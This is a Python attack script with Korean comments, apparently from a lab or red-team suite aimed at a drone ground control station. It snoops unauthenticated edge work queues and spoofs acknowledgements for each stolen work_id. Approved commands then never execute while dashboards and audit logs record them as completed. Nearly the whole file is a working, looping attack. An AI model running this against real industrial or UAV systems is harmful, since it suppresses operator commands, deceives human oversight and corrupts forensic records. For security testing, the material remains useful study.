"""
Edge Work Queue Snooping + ACK Spoofing 공격
독창 시나리오 #12 | IEEE S&P 2024 "Work Queue Hijacking in Industrial IoT"

GCS 취약점: /api/edge/work 엔드포인트가 인증 없이 임의 edge_id의 작업 큐 조회 허용
           /api/edge/work/ack 도 마찬가지로 인증 없음

공격 전략:
  Phase 1 (Snooping):    GET /api/edge/work?edge_id=<합법 엣지>
                         → 승인된 커맨드/미션 work_id 목록 수집
  Phase 2 (ACK Spoofing): POST /api/edge/work/ack { work_id, edge_id, result="ack" }
                          → GCS가 실제 엣지가 커맨드를 수신했다고 기록
                          → 실제 엣지는 커맨드를 전달받지 못함 → 미실행 상태로 완료 처리

결과:
  - 승인된 정상 커맨드가 실행되지 않음 (ACK 위조)
  - 대시보드/운용자는 커맨드 정상 완료 인식
  - 감사 로그에 위조 ACK가 정상 이벤트로 기록 → 포렌식 오염
"""
from __future__ import annotations

import argparse
import time
from .common import GcsClient, wait_for_gcs

TARGET_EDGES = [
    "edge-dronebot-01",
    "edge-uav-bidir-01",
]


def _snoop_work(client: GcsClient, edge_id: str) -> list[dict]:
    """합법 엣지의 작업 큐 무인증 열람"""
    try:
        resp = client.get(f"/api/edge/work?edge_id={edge_id}")
        payload = resp.get("payload", resp)
        items = payload.get("items", [])
        if items:
            print(f"[edge_snoop] ★ {edge_id} 작업 큐 {len(items)}건 열람 성공!", flush=True)
            for item in items:
                print(
                    f"  work_id={item.get('work_id')} "
                    f"type={item.get('work_type')} "
                    f"asset={item.get('asset_id')}",
                    flush=True,
                )
        else:
            print(f"[edge_snoop] {edge_id} 작업 큐 비어 있음", flush=True)
        return items
    except Exception as e:
        print(f"[edge_snoop] {edge_id} 열람 오류: {e}", flush=True)
        return []


def _spoof_ack(client: GcsClient, edge_id: str, work_id: str) -> None:
    """훔친 work_id로 ACK 위조 — 실제 엣지가 커맨드를 받지 못한 채 완료 처리"""
    try:
        resp = client.post("/api/edge/work/ack", {
            "edge_id": edge_id,
            "work_id": work_id,
            "result":  "ack",
        })
        print(f"[edge_snoop] ★★ ACK 위조 성공! edge={edge_id} work_id={work_id}", flush=True)
        print(f"  → GCS 응답: {resp}", flush=True)
    except Exception as e:
        print(f"[edge_snoop] ACK 위조 오류 work_id={work_id}: {e}", flush=True)


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Edge Work Queue Snooping + ACK Spoofing 공격")
    parser.add_argument("--service-url",     default="http://dah-gcs:8080")
    parser.add_argument("--target-edges",    nargs="+", default=TARGET_EDGES,
                        help="감시할 합법 엣지 ID 목록")
    parser.add_argument("--spoof-ack",       action="store_true", default=True,
                        help="훔친 work_id로 ACK 위조 실행 여부")
    parser.add_argument("--interval-s",      type=float, default=8.0,
                        help="감시 반복 간격 (s)")
    parser.add_argument("--duration-s",      type=float, default=120.0)
    args = parser.parse_args(argv)

    client = GcsClient(args.service_url)
    wait_for_gcs(client)

    print(
        f"[edge_snoop] Edge Work Snooping + ACK Spoofing 시작\n"
        f"  감시 대상 엣지: {args.target_edges}\n"
        f"  ACK 위조 활성: {args.spoof_ack}\n"
        f"  감지: GET /api/edge/work 는 인증 없음 → 누구나 작업 큐 열람 가능",
        flush=True,
    )

    start = time.time()
    spoofed_ids: set[str] = set()

    while (time.time() - start) < args.duration_s:
        for edge_id in args.target_edges:
            items = _snoop_work(client, edge_id)

            if args.spoof_ack:
                for item in items:
                    wid = item.get("work_id")
                    if wid and wid not in spoofed_ids:
                        _spoof_ack(client, edge_id, wid)
                        spoofed_ids.add(wid)

        elapsed = time.time() - start
        print(
            f"[edge_snoop] 경과={elapsed:.0f}s | 위조 ACK 총 {len(spoofed_ids)}건",
            flush=True,
        )
        time.sleep(args.interval_s)

    print(f"[edge_snoop] 종료 — 총 ACK 위조: {len(spoofed_ids)}건", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
